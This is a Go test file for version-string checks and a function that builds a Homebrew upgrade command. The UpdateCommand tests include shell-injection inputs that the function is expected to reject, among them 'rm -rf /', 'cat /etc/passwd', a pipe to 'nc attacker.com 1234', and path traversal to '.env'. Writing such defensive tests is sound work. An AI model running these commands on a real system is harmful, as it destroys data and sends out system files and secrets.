package version

import "testing"

func TestIsDevelopmentVersion(t *testing.T) {
	tests := []struct {
		input    string
		expected bool
	}{
		// Empty and unknown versions
		{"", true},
		{"unknown", true},
		{"dev", true},
		{"devel", true},

		// Development versions with build metadata
		{"devel+abc123", true},
		{"devel+abc+dirty", true},
		{"devel+git.sha.abc123def", true},
		{"devel+20240101", true},
		{"v0.66.0+devel.feat-gh-all-tasks.abcdef.dirty", true},
		{"v0.0.0+devel.detached.abcdef", true},
		{"v0.66.0+release.devel", false},

		// Valid release versions (should be false)
		{"v0.1.0", false},
		{"0.1.0", false},
		{"1.0.0-beta", false},
		{"v1.0.0-alpha", false},
		{"v2.5.3", false},
		{"1.0.0-rc.1", false},

		// Edge cases - partial matches should not trigger dev
		{"develop", false},
		{"development", false},
		{"my-devel", false},
		{"devel", true},

		// Case sensitivity
		{"DEV", false}, // case-sensitive, so should be false
		{"DEVEL", false},
		{"Dev", false},

		// Versions that look semver-like but with dev prefix
		{"dev1.0.0", false},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := IsDevelopmentVersion(tt.input)
			if got != tt.expected {
				t.Errorf("IsDevelopmentVersion(%q) = %v, want %v", tt.input, got, tt.expected)
			}
		})
	}
}

func TestUpdateCommand(t *testing.T) {
	tests := []struct {
		version  string
		expected string
	}{
		// Valid standard versions
		{"v1.2.3", `brew update && brew upgrade yoophi/tap/td`},
		{"1.2.3", `brew update && brew upgrade yoophi/tap/td`},

		// Valid prerelease versions
		{"v0.3.0-beta", `brew update && brew upgrade yoophi/tap/td`},
		{"v1.0.0-rc.1", `brew update && brew upgrade yoophi/tap/td`},
		{"v0.1.0-alpha", `brew update && brew upgrade yoophi/tap/td`},
		{"1.5.0-beta.2", `brew update && brew upgrade yoophi/tap/td`},

		// Valid versions with complex prerelease identifiers
		{"v2.0.0-rc1.test", `brew update && brew upgrade yoophi/tap/td`},

		// Invalid: empty string
		{"", ""},

		// Invalid: non-version strings
		{"invalid", ""},
		{"not-a-version", ""},
		{"hello", ""},

		// Invalid: shell injection attempts
		{`"; rm -rf /`, ""},
		{"v1.2.3; echo pwned", ""},
		{"v1.2.3$(whoami)", ""},
		{"v1.2.3`whoami`", ""},
		{"v1.2.3 && cat /etc/passwd", ""},
		{"v1.2.3 | nc attacker.com 1234", ""},

		// Invalid: path traversal attempts
		{"../../../etc/passwd", ""},
		{"../../.env", ""},

		// Invalid: prerelease identifier errors
		{"v1.2.3--", ""},        // double hyphen
		{"v1.2.3-", ""},         // trailing hyphen
		{"v1.2.3-beta-", ""},    // trailing hyphen in prerelease
		{"v1.2.3-.beta", ""},    // leading dot after hyphen
		{"v1.2.3-beta.", ""},    // trailing dot
		{"v1.2.3-beta..rc", ""}, // double dot
		{"v1.2.3-_invalid", ""}, // underscore in prerelease
		{"v1.2.3-beta_release", ""},

		// Invalid: missing version parts
		{"v1.2", ""},
		{"v1", ""},

		// Invalid: too many version parts
		{"v1.2.3.4", ""},

		// Invalid: non-numeric parts
		{"vA.B.C", ""},
		{"v1.a.3", ""},
	}

	for _, tt := range tests {
		t.Run(tt.version, func(t *testing.T) {
			got := UpdateCommand(tt.version)
			if got != tt.expected {
				t.Errorf("UpdateCommand(%q) = %q, want %q", tt.version, got, tt.expected)
			}
		})
	}
}

func TestUpdateCommandStructure(t *testing.T) {
	// Test that valid commands have the expected structure
	validVersions := []string{"v1.0.0", "1.2.3", "v0.1.0-beta"}

	for _, version := range validVersions {
		t.Run("structure_"+version, func(t *testing.T) {
			cmd := UpdateCommand(version)
			if cmd == "" {
				t.Errorf("UpdateCommand(%q) returned empty string for valid version", version)
			}

			if cmd != "brew update && brew upgrade yoophi/tap/td" {
				t.Errorf("UpdateCommand must target the fork tap, got %q", cmd)
			}
		})
	}
}
